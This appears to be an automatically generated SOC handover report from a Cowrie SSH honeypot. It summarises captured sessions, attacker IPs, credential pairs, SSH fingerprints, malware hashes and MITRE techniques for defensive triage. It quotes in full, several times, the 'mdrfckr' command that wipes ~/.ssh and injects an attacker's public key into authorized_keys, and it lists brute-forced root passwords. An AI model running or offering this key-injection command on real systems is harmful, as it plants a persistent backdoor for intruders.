# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-30 |
| **Generated At** | 2026-04-30T21:06:07Z |
| **Shift Time** | 21:06 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **836** |
| Confirmed Threats | **10** |
| False Positives Filtered | **826** (98.8%) |
| Unique Attacker IPs | **26** |
| Countries of Origin | **14** |
| High Severity Cases | **4** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **832** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **6** |
| Unique Credential Pairs | **4** |
| Unique Usernames | **2** |
| Unique Passwords | **4** |
| Successful Auth Pairs | **4** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 4 |
| `345gs5662d34` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 2 |
| `3245gs5662d34` | 2 |
| `Qwe123!@` | 1 |
| `!Qaz2wsx3edc4rfv` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `3245gs5662d34` | 2 |
| `root` | `Qwe123!@` | 1 |
| `root` | `!Qaz2wsx3edc4rfv` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Qwe123!@` | `196.92.7.249` | 2026-04-30T19:55:31 |
| `root` | `3245gs5662d34` | `196.92.7.246` | 2026-04-30T19:55:35 |
| `root` | `!Qaz2wsx3edc4rfv` | `60.199.224.55` | 2026-04-30T20:18:44 |
| `root` | `3245gs5662d34` | `60.199.224.55` | 2026-04-30T20:18:48 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **836** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 10 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 6 | 4 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 6 | 4 | libssh-based |
| `95420f9d932d...` | libssh | 4 | 3 | — |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `60.199.224.55`, `196.92.7.249`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **26** |
| Unique ASNs | **20** |
| High-Risk ASNs | **5** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS6713` | Office National des Postes et Telecommunications ONPT (Maroc Telecom) / IAM | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS9924` | Taiwan Fixed Network, Telco and Network Service Provider. | 1 | HIGH |
| `AS8193` | Uzbektelekom Joint Stock Company | 1 | MEDIUM |
| `AS19871` | Network Solutions, LLC | 1 | LOW |
| `AS55836` | Reliance Jio Infocomm Limited | 1 | LOW |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (4)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-70729414a696

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]249` |
| **First Seen** | 2026-04-30 19:55 |
| **Last Seen** | 2026-04-30 19:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 19:55:30` | `cowrie.session.connect` |
| `2026-04-30 19:55:30` | `cowrie.client.version` |
| `2026-04-30 19:55:30` | `cowrie.client.kex` |
| `2026-04-30 19:55:31` | `cowrie.login.success` |
| `2026-04-30 19:55:31` | `cowrie.session.params` |
| `2026-04-30 19:55:31` | `cowrie.command.input` |
| `2026-04-30 19:55:31` | `cowrie.command.failed` |
| `2026-04-30 19:55:32` | `cowrie.log.closed` |
| `2026-04-30 19:55:32` | `cowrie.session.params` |
| `2026-04-30 19:55:32` | `cowrie.command.input` |
| `2026-04-30 19:55:32` | `cowrie.session.file_download` |
| `2026-04-30 19:55:32` | `cowrie.log.closed` |
| `2026-04-30 19:55:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]249` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2db8d1fdbd4

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]246` |
| **First Seen** | 2026-04-30 19:55 |
| **Last Seen** | 2026-04-30 19:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 19:55:34` | `cowrie.session.connect` |
| `2026-04-30 19:55:34` | `cowrie.client.version` |
| `2026-04-30 19:55:34` | `cowrie.client.kex` |
| `2026-04-30 19:55:35` | `cowrie.login.success` |
| `2026-04-30 19:55:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]246` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92fc4222ef45

| Field | Detail |
|---|---|
| **Source IP** | `60.199.224[.]55` |
| **First Seen** | 2026-04-30 20:18 |
| **Last Seen** | 2026-04-30 20:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 20:18:43` | `cowrie.session.connect` |
| `2026-04-30 20:18:43` | `cowrie.client.version` |
| `2026-04-30 20:18:43` | `cowrie.client.kex` |
| `2026-04-30 20:18:44` | `cowrie.login.success` |
| `2026-04-30 20:18:44` | `cowrie.session.params` |
| `2026-04-30 20:18:44` | `cowrie.command.input` |
| `2026-04-30 20:18:44` | `cowrie.command.failed` |
| `2026-04-30 20:18:45` | `cowrie.log.closed` |
| `2026-04-30 20:18:45` | `cowrie.session.params` |
| `2026-04-30 20:18:45` | `cowrie.command.input` |
| `2026-04-30 20:18:45` | `cowrie.session.file_download` |
| `2026-04-30 20:18:45` | `cowrie.log.closed` |
| `2026-04-30 20:18:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.199.224[.]55` to AbuseIPDB if not already reported
- [ ] Block `60.199.224[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-680ddd3eca6a

| Field | Detail |
|---|---|
| **Source IP** | `60.199.224[.]55` |
| **First Seen** | 2026-04-30 20:18 |
| **Last Seen** | 2026-04-30 20:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 20:18:47` | `cowrie.session.connect` |
| `2026-04-30 20:18:47` | `cowrie.client.version` |
| `2026-04-30 20:18:47` | `cowrie.client.kex` |
| `2026-04-30 20:18:48` | `cowrie.login.success` |
| `2026-04-30 20:18:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.199.224[.]55` to AbuseIPDB if not already reported
- [ ] Block `60.199.224[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `20.14.95[.]138` | **2** | 2026-04-30 20:00 | 2026-04-30 20:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `183.64.171[.]136` | 1 | 2026-04-30 20:54 | 2026-04-30 20:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `196.92.7[.]247` | 1 | 2026-04-30 19:55 | 2026-04-30 19:55 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `217.154.199[.]78` | 1 | 2026-04-30 19:42 | 2026-04-30 19:42 | 30s | 0 | `T1592` | 🟢 LOW |
| `60.199.224[.]55` | 1 | 2026-04-30 20:18 | 2026-04-30 20:18 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (25 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `183.64.171[.]136` | CN | CHINANET Chongqing Province Network | **100** ⚠️ | 0 |
| `217.154.199[.]78` | DE | IONOS SE | **100** ⚠️ | 1 |
| `196.92.7[.]249` | MA | Office National des Postes et Telecommunications ONPT (Maroc Telecom) / IAM | **100** ⚠️ | 50 |
| `196.92.7[.]246` | MA | Office National des Postes et Telecommunications ONPT (Maroc Telecom) / IAM | **100** ⚠️ | 50 |
| `60.199.224[.]55` | TW | Taiwan Fixed Network CO.,LTD. | **100** ⚠️ | 50 |
| `196.92.7[.]247` | MA | Office National des Postes et Telecommunications ONPT (Maroc Telecom) / IAM | **100** ⚠️ | 50 |
| `20.14.95[.]138` | US | Microsoft Corporation | **100** ⚠️ | 0 |
| `84.54.73[.]76` | UZ | Uzbektelekom Joint Stock Company | **56** | 1 |
| `80.66.76[.]105` | RU | Gening Nikita Dmitrievich | **46** | 2 |
| `162.241.149[.]223` | US | Unified Layer | **45** | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 11 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 4 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 2 |

---

## 🔕 False Positive Summary (826 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 9 |
| AbuseIPDB score 15 below threshold 25 | 792 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 22 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 836 cases |
| Tool 34  | Credential Extractor        | ✅ 6 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 26 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 826 filtered (98.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 25 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 4 priority case(s) shown individually · 5 recon entry/entries in table (1 group(s) consolidating 2 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-30T21:06:07Z_
